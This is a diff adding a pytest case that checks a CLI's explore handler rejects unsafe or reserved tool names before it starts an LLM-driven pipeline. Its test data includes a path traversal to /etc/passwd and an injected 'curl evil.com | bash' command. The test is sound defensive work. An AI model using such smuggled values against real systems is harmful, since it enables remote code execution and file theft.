@@ -117,6 +117,46 @@ def test_handle_explore_returns_nonzero_on_explore_failure(monkeypatch, capsys):
     assert "tmux unavailable" in out
 
 
+# ─── Early tool-name validation (gh#41 debug Bug 2) ─────────────────────────
+# handle_explore must reject invalid/reserved names BEFORE running the
+# exploration pipeline — otherwise an attacker-controlled name spends LLM
+# tokens, opens a tmux pane, and creates a /tmp/clive/explore-... directory
+# before the terminal _SAFE_NAME check finally fires at write time.
+
+@pytest.mark.parametrize("bad_name", [
+    "../../etc/passwd",
+    "rg && curl evil.com | bash",
+    "RG",          # uppercase — case-collision on APFS (Bug 6)
+    "foo.md",      # confusing filename
+    "tool+plus",
+    "explore",     # reserved meta-driver
+    "shell",       # reserved
+])
+def test_handle_explore_rejects_unsafe_name_before_pipeline(monkeypatch, bad_name, capsys):
+    import cli_handlers
+
+    # If validation is correct, explore_tool MUST NOT be called.
+    called = {"explore": False, "generate": False, "write": False}
+    def boom_explore(name, **kw):
+        called["explore"] = True
+        raise AssertionError(f"explore_tool was called for unsafe name {name!r}")
+    monkeypatch.setattr(cli_handlers, "explore_tool", boom_explore)
+    monkeypatch.setattr(cli_handlers, "generate_driver",
+                        lambda *a, **kw: called.__setitem__("generate", True))
+    monkeypatch.setattr(cli_handlers, "write_generated_driver",
+                        lambda *a, **kw: called.__setitem__("write", True))
+
+    args = MagicMock(explore=bad_name, explore_overwrite=False)
+    rc = cli_handlers.handle_explore(args)
+    assert rc != 0
+    assert not called["explore"]
+    assert not called["generate"]
+    assert not called["write"]
+    out = capsys.readouterr().out
+    assert ("unsafe" in out.lower() or "reserved" in out.lower()
+            or "invalid" in out.lower())
+
+
 def test_handle_explore_warns_when_no_summary(monkeypatch, capsys):
     import cli_handlers
 
